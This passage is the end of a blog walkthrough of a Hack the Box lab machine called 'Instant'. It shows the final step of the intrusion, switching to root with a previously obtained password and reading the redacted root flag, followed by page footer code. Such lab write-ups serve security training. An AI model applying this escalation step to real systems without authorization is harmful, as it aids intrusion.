</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><h1 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h1>
<p>Since we have the <code>root</code> password, we can simply change user, and read the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shirohige@instant:~$ su root
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span>root@instant:/home/shirogen# cd
</span></span><span style="display:flex;"><span>root@instant:~# cat root.txt
</span></span><span style="display:flex;"><span>&lt;REDACTED&gt;
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://pshegger.github.io/tags/hack-the-box/">Hack the Box</a></li>
      <li><a href="https://pshegger.github.io/tags/htb/">HTB</a></li>
      <li><a href="https://pshegger.github.io/tags/penetration-testing/">Penetration Testing</a></li>
      <li><a href="https://pshegger.github.io/tags/walkthrough/">Walkthrough</a></li>
      <li><a href="https://pshegger.github.io/tags/reverse-engineering/">Reverse Engineering</a></li>
    </ul>

<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Instant - Machine Walkthrough on x"
            href="https://x.com/intent/tweet/?text=Instant%20-%20Machine%20Walkthrough&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fhtb-instant%2f&amp;hashtags=hackthebox%2cHTB%2cpenetrationtesting%2cwalkthrough%2creverseengineering">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Instant - Machine Walkthrough on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fhtb-instant%2f&amp;title=Instant%20-%20Machine%20Walkthrough&amp;summary=Instant%20-%20Machine%20Walkthrough&amp;source=https%3a%2f%2fpshegger.github.io%2fposts%2fhtb-instant%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Instant - Machine Walkthrough on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fpshegger.github.io%2fposts%2fhtb-instant%2f&title=Instant%20-%20Machine%20Walkthrough">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Instant - Machine Walkthrough on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=Instant%20-%20Machine%20Walkthrough&u=https%3a%2f%2fpshegger.github.io%2fposts%2fhtb-instant%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://pshegger.github.io/">pshegger&#39;s blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
